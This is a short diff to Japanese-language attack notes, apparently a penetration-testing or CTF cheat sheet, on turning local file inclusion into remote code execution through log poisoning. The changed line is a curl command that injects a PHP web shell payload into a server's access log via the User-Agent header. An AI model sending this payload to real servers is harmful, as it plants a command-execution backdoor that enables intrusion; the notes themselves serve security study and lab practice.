@@ -42,7 +42,7 @@ LFIを使ってサーバーのログファイルを画面に表示する
 
 #### ポイズニング
 
-`curl http://TARGETIP -A "<?php system($_GET['cmd']); ?>"`
+`curl http://$IP -A "<?php system(\$_GET['cmd']); ?>"`
 
 #### RCEの実行
 
